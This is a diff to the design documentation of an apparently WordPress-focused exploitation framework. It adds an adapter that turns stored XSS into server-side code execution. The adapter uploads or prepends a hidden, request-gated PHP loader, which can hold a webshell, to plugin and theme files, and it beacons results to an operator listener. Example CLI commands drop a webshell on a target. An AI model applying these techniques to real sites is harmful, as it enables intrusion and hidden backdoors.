@@ -22,9 +22,11 @@ CLI mode flow:
    d. Check auth requirements
    e. Match payload to exploit (right-to-left capability match)
    f. Get instructions from payload
+      ↳ XSS→RCE adapter (if active): convert each RCE instruction to XSS delivery JS
    g. Identify delivery exploit and transformers
    h. Execute: transformers → delivery → collect results
    i. Call payload.report(results)
+   j. XSS→RCE adapter (if active): wait for beacon, emit XSS-specific status
 ```
 
 ## Chain Resolution
@@ -37,6 +39,116 @@ The framework:
 3. Matches payload `webshell` (methods=["RCE"]) to rightmost RCE exploit
 4. Identifies delivery exploit (first with `delivers=None`)
 5. Remaining exploits are transformers, processed right-to-left
+
+## XSS→RCE Adapter
+
+The XSS→RCE adapter is a framework-core transformer that lets an RCE payload be
+delivered through a stored-XSS exploit. It is toggled by the operator
+(`--xss-rce-adapter`), not written by module authors.
+
+Communicating impact is the point: `alert(1)` proves XSS to a researcher but
+means nothing to a webmaster. Code running on the server — a file written, a
+command executed — is unambiguous. The adapter turns a stored-XSS finding into
+demonstrated RCE.
+
+### Chain shape
+
+Resolved right-to-left, like any transformer:
+
+```
+payload(RCE) → [adapter, delivers="XSS"] → exploit(XSS, stored)
+```
+
+- The payload is **unchanged** and owns its PHP completely — filename, target
+  path, file-writing logic. It does not know the adapter exists. To the adapter
+  the instruction is just opaque PHP: it could be a webshell dropper or
+  `echo "hi"`.
+- The adapter prepends a server-side call-home block, then wraps the whole thing
+  in admin-context JavaScript that delivers it to the server and triggers it. It
+  never names anything for the payload and never rewrites the payload's PHP.
+- The XSS exploit stores the JS and returns immediately.
+
+### Enabling it
+
+```bash
+# Drop an RCE payload via a stored-XSS exploit
+hwp -t http://target.com --exploit hwp-training/1.0.0-xss --payload webshell --xss-rce-adapter
+
+# Add a beacon to confirm server-side execution (true RCE)
+hwp -t ... --exploit hwp-training/1.0.0-xss --payload webshell --xss-rce-adapter --lhost 10.0.0.5 --lport 8888
+
+# Stream the JS sink chain to the browser console for debugging
+hwp -t ... --exploit ... --payload webshell --xss-rce-adapter --adapter-debug
+```
+
+The adapter only *activates* when it is enabled AND the matched exploit is an XSS
+sink AND the payload produced an RCE instruction. Otherwise the run proceeds
+normally.
+
+### The loader
+
+What the adapter delivers is one PHP block, dormant unless requested with
+`?hwp-beacon=1`:
+
+```php
+<?php if (isset($_REQUEST['hwp-beacon'])) {
+    <call-home machinery>
+    ob_start();
+    <PAYLOAD PHP, verbatim>
+    <emit JSON to browser + POST it to the listener>
+    die();
+} ?>
+<original file content>          // edit sinks only
+```
+
+The gate means the block does nothing on a normal request, so when an edit sink
+prepends it to an existing file, that file keeps its behaviour. The block goes
+**first** (and `die()`s inside the gate) for two reasons: the original file might
+`die()` early (e.g. `defined('ABSPATH')||die;`), which would stop the loader from
+running if appended below; and the original's normal output would otherwise
+pollute the clean JSON beacon response.
+
+The payload's own `echo` is captured (`ob_start`/`ob_get_clean`) and returned in
+the JSON `output` field. A `register_shutdown_function` guard ensures this still
+reports even if the payload calls `die()`/`exit()` or fatals.
+
+### Sinks
+
+At browser-fire time the JS tries sinks in reliability order, each gated on the
+admin's capability and **verified reachable** before being treated as success:
+
+| Sink | Mechanism |
+|------|-----------|
+| plugin-upload | install a throwaway `.zip` plugin carrying the loader |
+| theme-upload  | install a throwaway `.zip` theme carrying the loader |
+| media-upload  | upload the loader `.php` to `wp-content/uploads/` (needs `unfiltered_upload`) |
+| theme-editor  | **prepend** the loader atop an existing theme file |
+| plugin-editor | **prepend** the loader atop an existing plugin file |
+
+A write that lands is not success on its own — some files can't be reached
+afterwards (e.g. `wp-content/plugins/akismet/.htaccess` denies direct access to
+its `.php`). Each sink verifies the written file responds to `?hwp-beacon=1` and
+only stops on a file that both writes AND fires; otherwise it falls through to
+the next file / next sink. Editor sinks fetch the file's current content and
+write `loader + original` (append), never replacing it.
+
+### Beacon
+
+The call-home is **PHP, not JavaScript**, on purpose: a server-side request has
+no CORS/same-origin restriction reaching the operator's listener.
+
+```
+--lhost set    → the loader's PHP posts back when it EXECUTES on the server.
+                 The framework starts a listener, waits, and reports the hit
+                 (loader location, payload output, whoami). This proves RCE.
+no --lhost     → no call-home. The JS still delivers + triggers the loader, and
+                 the browser still receives the JSON outcome (visible with
+                 --adapter-debug), confirming execution.
+```
+
+The framework (`chain.py`) owns the listener lifecycle and all XSS-specific
+operator messaging, so the unchanged payload's `report()` never has to know this
+happened. See `lib/adapter.py` and `lib/beacon_server.py`.
 
 ## AUTH Flow
 
@@ -83,6 +195,7 @@ resp = self.http.get(url)              # no cookies sent
 **Framework:**
 - Session/credential storage → silent always
 - Result field dump → very verbose only (`-vv`)
+- XSS→RCE adapter / beacon status → emitted by the framework, not the payload
 - Error conditions → always
 
 ## Error Handling
@@ -180,6 +293,8 @@ hwp/
 ├── hwp/                    # Public package (from hwp import Exploit, Payload)
 │   └── __init__.py
 ├── lib/                    # Framework internals
+│   ├── adapter.py          # XSS→RCE adapter (core transformer)
+│   ├── beacon_server.py    # Beacon listener for server-side RCE confirmation
 │   ├── chain.py            # Chain resolver & executor
 │   ├── exploit.py          # Exploit base class
 │   ├── http.py             # HTTP wrapper with auth gating
